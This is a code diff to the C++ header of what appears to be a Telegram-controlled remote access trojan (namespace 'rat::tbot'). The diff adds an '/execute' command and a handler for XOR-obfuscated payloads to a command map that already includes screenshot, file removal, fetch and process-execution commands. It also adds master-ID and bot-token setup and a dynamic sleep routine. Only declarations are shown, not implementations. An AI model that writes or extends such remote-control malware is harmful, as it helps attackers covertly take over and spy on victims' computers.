@@ -56,7 +56,7 @@ class Handler {
 		                          // that actually executes the handling logic.
 	};
 
-	const std::array<CommandHandler, 22> command_map = {
+	const std::array<CommandHandler, 23> command_map = {
 	    {// resets the internal state of the handler, by destroying the object
 	     // this->state and reinstantiating it.
 	     {"/reset", &Handler::handleResetCommand},
@@ -92,9 +92,9 @@ class Handler {
 	     {"/rm", &Handler::handleRmCommand},
 	     // similaor to unix mv
 	     {"/mv", &Handler::handleMvCommand},
-		 {"/mkdir", &Handler::handleMkdirCommand},
+	     {"/mkdir", &Handler::handleMkdirCommand},
 
-		 // copies the file or the dir
+	     // copies the file or the dir
 	     {"/cp", &Handler::handleCpCommand},
 	     // supposedly sets the option in the bot or the state
 	     {"/set", &Handler::handleSetCommand},
@@ -105,6 +105,7 @@ class Handler {
 	     // dependent on the environnment of executes and add syntactic sugar
 	     // over /process.
 	     {"/fetch", &Handler::handleFetchCommand},
+	     {"/execute", &Handler::handleExecuteCommand},
 	     {"/lprocess", &Handler::handleProcessCommand},
 	     {"/process", &Handler::handleProcessCommand}}};
 
@@ -116,6 +117,7 @@ class Handler {
 	void parseTelegramMessageToCommand(void);
 
 	// Command handler methods
+
 	void handleResetCommand();
 	void handleScreenshotCommand();
 	void handleDropCommand();
@@ -137,6 +139,7 @@ class Handler {
 	void handleCpCommand();
 	void handleSetCommand();
 	void handleFetchCommand();
+	void handleExecuteCommand();
 	// Dispatchers - direct member function calls
 	void dispatchIntegratedCommand();
 
@@ -151,6 +154,7 @@ class Handler {
 	inline void handlePayload(::rat::tbot::Message &Tbot_Message,
 	                          const std::filesystem::path &Payload_Path);
 
+	inline void handleXoredPayload(::rat::tbot::Message &Tbot_Message);
 	void handlePayloadCommand(void);
 	void _dynamicSleep();
 
@@ -162,13 +166,13 @@ class Handler {
 	};
 
 	~Handler() {};
-	Handler& setMasterId(uint64_t Master_Id);
-	Handler& initMainBot(const char *arg_Token);
-	Handler& initBackingBot(const char *arg_Token);
-	Handler& initCurlClient(uint8_t Operation_Restart_Bound = 5);
-	Handler& initThreadPools(uint8_t Number_Long_Process_Threads = 1,
-	                     uint8_t Number_Short_Process_Threads = 2,
-	                     uint8_t Number_Helper_Threads = 2);
+	Handler &setMasterId(uint64_t Master_Id);
+	Handler &initMainBot(const char *arg_Token);
+	Handler &initBackingBot(const char *arg_Token);
+	Handler &initCurlClient(uint8_t Operation_Restart_Bound = 5);
+	Handler &initThreadPools(uint8_t Number_Long_Process_Threads = 1,
+	                         uint8_t Number_Short_Process_Threads = 2,
+	                         uint8_t Number_Helper_Threads = 2);
 	// Handle Telegram update
 
 	void handleUpdates();
